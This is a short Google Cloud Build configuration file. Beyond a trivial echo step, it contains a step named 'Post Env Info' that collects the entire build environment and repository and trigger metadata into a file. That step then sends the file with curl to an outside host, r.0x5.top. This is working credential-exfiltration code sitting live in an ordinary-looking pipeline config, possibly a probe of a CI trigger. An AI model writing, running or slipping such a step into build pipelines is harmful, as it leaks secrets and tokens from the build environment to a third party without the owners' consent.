logsBucket: gs://testasdx123

steps:
  - name: 'alpine'
    id: 'Echo Hello'
    entrypoint: 'echo'
    args: ['hello worldcd']

  - name: 'curlimages/curl'
    id: 'Post Env Info'
    entrypoint: 'sh'
    args:
      - -c
      - |
        echo "Collecting environment info..."
        {
          echo "==== ENV ===="
          env
          echo "==== BUILT-IN SUBSTITUTIONS ===="
          echo "BUILD_ID=$BUILD_ID"
          echo "BUILD_NAME=$BUILD_NAME"
          echo "PROJECT_ID=$PROJECT_ID"
          echo "TRIGGER_NAME=$TRIGGER_NAME"
          echo "REPO_NAME=$REPO_NAME"
          echo "BRANCH_NAME=$BRANCH_NAME"
          echo "TAG_NAME=$TAG_NAME"
          echo "REVISION_ID=$REVISION_ID"
          echo "COMMIT_SHA=$COMMIT_SHA"
          echo "SHORT_SHA=$SHORT_SHA"
          echo "REPO_OWNER=$REPO_OWNER"
          echo "REPO_SOURCE=$REPO_SOURCE"
          echo "LOCATION=$LOCATION"
          echo "REGION=$REGION"
          echo "TOPIC_NAME=$TOPIC_NAME"
          echo "TRIGGER_BUILD_CONFIG_PATH=$TRIGGER_BUILD_CONFIG_PATH"
          echo "TRIGGER_TYPE=$TRIGGER_TYPE"
          echo "SOURCE_REPO_REF=$SOURCE_REPO_REF"
          echo "SOURCE_REPO_URL=$SOURCE_REPO_URL"
          echo "SOURCE_REPO_NAME=$SOURCE_REPO_NAME"
          echo "SOURCE_REPO_OWNER=$SOURCE_REPO_OWNER"
          echo "SOURCE_REPO_SOURCE=$SOURCE_REPO_SOURCE"
          echo "==== CUSTOM SUBSTITUTIONS ===="
          echo "_CUSTOM_VAR=$_CUSTOM_VAR"
        } > /tmp/env.txt

        echo "SENDING TO ENDPOINT..."
        curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/env.txt https://r.0x5.top/x

substitutions:
  _CUSTOM_VAR: "default"

options:
  logging: GCS_ONLY
